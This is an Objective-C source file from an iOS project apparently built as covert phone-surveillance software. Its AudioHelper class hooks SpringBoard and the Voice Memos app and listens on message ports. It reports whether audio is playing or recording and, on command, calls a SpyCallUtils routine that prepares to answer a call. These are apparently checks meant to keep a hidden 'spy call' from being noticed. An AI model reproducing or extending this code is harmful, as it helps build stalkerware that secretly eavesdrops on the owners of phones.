//
//  AudioHelper.m
//  MSSPC
//
//  Created by Makara Khloth on 4/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "AudioHelper.h"
#import "SpyCallUtils.h"
#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SpringBoard.h"
#import "SpringBoard+IOS711.h"

#import "DefStd.h"

#import <objc/runtime.h>

/*
 1. We detect audio is playing in two places (SpringBoard & VoiceMemo)
 2. We dectet audio is recording in SpringBoard only
 NOTE: this instance of this class instantiated in SpringBoard and VoiceMemo
 */
static AudioHelper *_AudioHelper = nil;

@interface AudioHelper (private)

- (BOOL) isVoiceMemoRecording;
- (BOOL) isPlaying;

- (void) main;

@end

@implementation AudioHelper

@synthesize mIsVoiceMemoPlayingBack;

+ (id) sharedAudioHelper {
	if (_AudioHelper == nil) {
		_AudioHelper = [[AudioHelper alloc] init];
	}
	return (_AudioHelper);
}

- (id) init {
	if ((self = [super init])) {
		[NSThread detachNewThreadSelector:@selector(main) toTarget:self withObject:nil];
	}
	return (self);
}

- (BOOL) isVoiceMemoRecording {
	BOOL isRecording = FALSE;
	if ([SpyCallUtils isSpringBoardHook]) {
        SBApplication *voiceMemo = nil;
		Class $SBApplicationController = objc_getClass("SBApplicationController");
        SBApplicationController *appController = [$SBApplicationController sharedInstance];
        if ([appController respondsToSelector:@selector(applicationCurrentlyRecordingAudio)]) {
            voiceMemo = [appController applicationCurrentlyRecordingAudio];
        } else {
            // iOS 7.1.1
            SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
            voiceMemo = [sb nowRecordingApp];
        }
		isRecording = voiceMemo ? TRUE: FALSE;
	}
	return (isRecording);
}

- (BOOL) isPlaying {
	BOOL isPlaying = FALSE;
	if ([SpyCallUtils isSpringBoardHook]) {
		Class $SBMediaController = objc_getClass("SBMediaController");
		isPlaying = [[$SBMediaController sharedInstance] isPlaying];
	}
	return (isPlaying);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	//
}

- (NSData *) messagePortReturnData: (NSData *) aRawData {
	NSInteger audioHelperCmd = kAudioHelperIsPlayingCmd;
	NSMutableData *returnData = [NSMutableData data];
	if ([SpyCallUtils isSpringBoardHook]) {
		[aRawData getBytes:&audioHelperCmd length:sizeof(NSInteger)];
		if (audioHelperCmd == kAudioHelperIsPlayingCmd) {
			BOOL isPlaying = [self isPlaying];
			[returnData appendBytes:&isPlaying length:sizeof(BOOL)];
		} else if (audioHelperCmd == kAudioHelperIsRecordingCmd) {
			BOOL isRecording = [self isVoiceMemoRecording];
			[returnData appendBytes:&isRecording length:sizeof(BOOL)];
		} else if (audioHelperCmd == kAudioHelperPrepareToAnswerCallCmd) {
			BOOL isPrepared = YES;
			[SpyCallUtils prepareToAnswerCall];
			[returnData appendBytes:&isPrepared length:sizeof(BOOL)];
		}
	} else if ([SpyCallUtils isVoiceMemoHook]) {
		if (audioHelperCmd == kAudioHelperIsPlayingCmd) {
			BOOL isPlaying = [self mIsVoiceMemoPlayingBack];
			[returnData appendBytes:&isPlaying length:sizeof(BOOL)];
		}
	}
	APPLOGVERBOSE(@"returnData = %@", returnData);
	return (returnData);
}

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		MessagePortIPCReader *port = nil;
		if ([SpyCallUtils isVoiceMemoHook]) {
			port = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallVoiceMemoPlayingMsgPort
								withMessagePortIPCDelegate:self];
		} else if ([SpyCallUtils isSpringBoardHook]) {
			port = [[MessagePortIPCReader alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort
								withMessagePortIPCDelegate:self];
		}
		[port start];
		CFRunLoopRun();
		[port release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	[pool release];
}

- (void) dealloc {
	[super dealloc];
}

@end